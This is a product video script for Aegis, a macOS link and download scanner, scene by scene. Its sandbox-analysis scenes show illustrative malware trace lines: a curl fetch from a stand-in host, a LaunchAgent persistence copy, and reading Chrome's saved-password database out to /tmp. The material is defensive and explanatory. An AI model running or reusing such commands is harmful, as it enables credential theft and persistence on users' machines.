# Aegis — product video script

**Length:** 1:36 · **Format:** 1920×1080, 30 fps · **Tone:** calm, specific, analyst-to-analyst (design-system/README.md › Content fundamentals). No alarm language, no exclamation marks, and nothing is ever called "safe".

**Files**

| File | What |
| --- | --- |
| `aegis-promo.html` | The animation. Open it in a browser to preview (space to play, scrub bar to seek). Every frame is a pure function of time. |
| `aegis-promo.mp4` | Final cut: picture, score, sound design and scratch narration. |
| `aegis-promo-no-vo.mp4` | Same cut without narration, for recording a real voiceover over it. |
| `audio.mjs` | Synthesizes the score and sound effects and mixes in the narration. |
| `render.cjs` | Renders the HTML frame by frame through Electron into ffmpeg. |
| `build.sh` | Runs everything: narration → audio → frames → both MP4s. |

The narration is a scratch track from macOS `say` (Samantha). To swap in a real voice, record each line below to `build/vo/<id>.aiff` (same ids) and run `./build.sh --keep-vo`. Line start times are in `VO_AT` in `audio.mjs`; if a new take runs longer than the gap before the next line, nudge that line's time there.

---

## Script

Times are when the line starts. **VO** is narration, **ON SCREEN** is what the picture does, **SOUND** is the design under it.

### 1 · Cold open — 0:00–0:08

**VO (01, 0:01.2)** Every day, you click hundreds of links, and download files you've never seen before.

**ON SCREEN** Rows of real-looking URLs and file names stream sideways in mono, a few lit red or cyan. "Every click." then "Every download." blur into focus. "Most of them, you've never seen before." The rows accelerate and a cyan scan line wipes to the next scene.

**SOUND** Low pad opening up from a closed filter; quiet ticks as the rows stream.

### 2 · The old way — 0:08–0:15.5

**VO (02, 0:08.6)** Most security tools wait until a file is already on your Mac, and only catch threats they've seen before.

**ON SCREEN** The background warms toward red. "Scan it after it lands." `invoice_oct.iso` drops into a laptop, which flashes "Threat detected — invoice_oct.iso was already opened." Then "Catch only what's known." `update_helper.pkg` drops in, gets "No threats found · not in database", and a bug crawls out. The laptop drains to grey.

**SOUND** Darker chords (Gm → A). A buzz on the late alert; an innocent blip on the miss.

### 3 · Meet Aegis — 0:15.5–0:22

**VO (03, 0:16.8)** Meet Aegis. It checks every link and every download, before it reaches you.

**ON SCREEN** The shield draws itself in cyan, fills, and the check mark strokes in. Radar rings pulse out. The shield slides left as **Aegis** rises letter by letter, with a light sweep across it. The tagline types out: "Every link and download, judged before it reaches you."

**SOUND** Riser into an impact on the first stroke; a bell chime on the check mark. The arpeggio starts.

### 4 · Four verdicts — 0:22–0:28

**VO (04a–e)** Each one gets a verdict. *(0:23.9)* Malicious. *(0:24.8)* Suspicious. *(0:25.6)* Unknown. *(0:26.4)* Or clean.

**ON SCREEN** "One of four verdicts — Never a colour alone." Each badge (icon + word) slams in on its word with a shockwave in its colour, over an example and its sentence: `login-northwlnd-io.sbs` This is dangerous · `cdn-assets-delivery.top` This looks risky · `bit.ly/3xQ9aLm` No confident verdict · `docs.vendor.com` No threats found.

**SOUND** A pitched blip and soft kick per badge, climbing.

### 5 · Links, stopped at the click — 0:28–0:41

**VO (05a, 0:28.6)** Phishing links are stopped at the click, and judged without ever being opened.
**VO (05b–e)** *(0:33.4)* Domain age. *(0:34.4)* Lookalike brands. *(0:35.6)* Safe Browsing. *(0:36.6)* And certificate records.

**ON SCREEN** A Gmail message from `no-reply@accounts-google.support`: "Unusual sign-in attempt blocked … Review at accounts.google.com/security". The link gets Aegis's solid red outline and a Malicious tag. The cursor clicks it and the click guard opens (copy from `extension/src/guard.ts`): *Aegis stopped this click · This link imitates a site you might trust · The link said accounts.google.com/security · It actually goes to login-northwlnd-io.sbs/sso · Back to safety / Continue anyway*. On the left, "Judged without opening it", then the four signals tick in on their words: Domain age `2 days`, Lookalike brand `google.com`, Safe Browsing `listed`, Certificate record `1 day old`. The cursor picks **Back to safety**; "Link never opened".

**SOUND** Click, a low thunk and two-note tone as the guard opens; a blip per signal; a small chime on Back to safety.

### 6 · Downloads, held — 0:41–0:46.5

**VO (06, 0:41.5)** Risky downloads are held in memory, before they ever touch your disk.

**ON SCREEN** "Held before it touches your disk." A Chrome download, `ZoomUpdate.pkg · 42.1 MB · zoom-updates.co`, stops at 64% and flips to "Held by Aegis". Below, bytes flow Chrome → Aegis · in memory; the path on to `~/Downloads` is dashed red behind a lock: "not written to disk".

**SOUND** Progress ticks, a double latch click and a low lock tone.

### 7 · Two analysts, two sandboxes — 0:46.5–1:00

**VO (07a, 0:47.0)** Then two independent AI analysts take it apart at once, each in its own throwaway sandbox, with the network switched off.
**VO (07b, 0:54.3)** Factory Droid, on Daytona. **(07c, 0:56.6)** And Chalk, on Chalk Compute.

**ON SCREEN** "Two independent analysts — Taken apart in a sandbox. Twice." The file chip splits in two and drops into two panels, each with a red **Network off** pill (which flares on "switched off"). Worker A, *Factory Droid · Daytona sandbox*: `pkgutil --expand`, `droid › read_file Scripts/postinstall`, `droid › run_sample sh -x postinstall`, `+ curl … cdn-zoom-update.top/s2` → **✕ blocked network is off**, `+ cp helper.plist ~/Library/LaunchAgents/` → **✎ wrote us.zoom.helper.plist**, `+ sqlite3 …/Chrome/Default/Login Data`, `verdict › MALICIOUS`. Worker B, *Chalk · Chalk Compute sandbox*: sha256, `MalwareBazaar via Chalk SQL — 0 known-bad matches (new sample)`, postinstall pipes a remote script to sh, **✕ blocked cdn-zoom-update.top:443**, LaunchAgent written, reads Chrome Login Data, `verdict › MALICIOUS`. Each worker's name glows as it is spoken.

**SOUND** Busiest section: quarter-note kick, 16th hats, typing ticks panned left (A) and right (B), buzzes on the blocks, a tone on each verdict.

### 8 · Compare — 1:00–1:07

**VO (08, 1:00.4)** Aegis compares their answers. The more severe one wins, and AI can only raise a verdict, never lower it.

**ON SCREEN** "The more severe answer wins." The two Malicious cards slide together and merge with a flash into **Both analysts agree · MALICIOUS**. On the right a verdict ladder: the rules marker sits on Suspicious; the AI marker lifts it to Malicious on a cyan trail; "Never lowered" with a struck-out down arrow.

**SOUND** Riser into an impact at the merge, then a rising sweep on the lift.

### 9 · The report — 1:07–1:14.5

**VO (09, 1:07.5)** Then it explains what would have happened, in plain English, with the exact code that does it.

**ON SCREEN** The Report: `ZoomUpdate.pkg · 13:58:40`, Malicious, "Installing this adds a hidden login item and copies Chrome's saved passwords." **What would have happened:** ① Downloads a second program from `cdn-zoom-update.top` ② Adds itself to your login items `us.zoom.helper.plist` ③ Reads Chrome's saved passwords `Login Data → /tmp/.zh`. Beside it, `Scripts/postinstall` with the matching lines sweeping red as each step lands. Pills: Both analysts agree · Quarantined. Slow push in.

**SOUND** A blip and tick per highlighted step.

### 10 · On your phone — 1:14.5–1:21

**VO (10, 1:15.0)** On your phone? Text Aegis a screenshot, and get a verdict back in seconds.

**ON SCREEN** "Text a screenshot. Get a verdict." An iMessage thread with Aegis: a screenshot of "USPS: Your package is on hold. Pay the $1.99 redelivery fee at usps-redelivery.top/pay" goes out; typing dots; the reply: Malicious — "The link goes to usps-redelivery.top, not usps.com. It was registered 3 days ago and asks for card details." Caption: links in the picture are judged the same way, without being opened.

**SOUND** Send swoosh, typing ticks, a two-note receive tone.

### 11 · Always on — 1:21–1:27

**VO (11, 1:21.6)** Everything lives in your menu bar. Always watching, never in the way.

**ON SCREEN** A macOS menu bar with the Aegis shield. The Overview builds behind it: coverage ring to 92, Links scanned 24,118 · Links blocked 212 · Files scanned 1,840 · Files quarantined 37, and the scan log. The **fn** key presses (or ⌃⌥A) and the mini panel drops from the shield: "Last hour: 3 held, 0 reached this Mac", with the latest verdicts. "Always on. Never in the way."

**SOUND** Key click, soft swoosh, a run of counter ticks that slows down.

### 12 · Outro — 1:27–1:36

**VO (12, 1:28.5)** Aegis. Know before you click.

**ON SCREEN** The shield draws again beside the wordmark, rings pulse, "Know before you click." Then "Built with Daytona · Factory · Chalk · Photon" and "HackHarvard 2026". Fade to black.

**SOUND** Riser, the biggest impact, a five-note chime; the pad resolves to D and fades.

---

## Accuracy notes

The video shows Aegis as designed. As of this branch some of it is still being built (README › Status, docs/PROGRESS.md): Worker A's approach is proven live (`pnpm try:droid`) and Worker B runs end to end (`pnpm try:chalk`), but both are not yet wired into the app; the Photon (iMessage) flow is milestone 5. If the video is shown before those land, present scenes 7, 8 and 10 as the product's design, not a recording. The ZoomUpdate.pkg sample, its script and the dashboard numbers are illustrative (the numbers come from the Figma demo data); the repo's real demo fixture (`demo/aegis-terminal-demo.command`) is harmless.
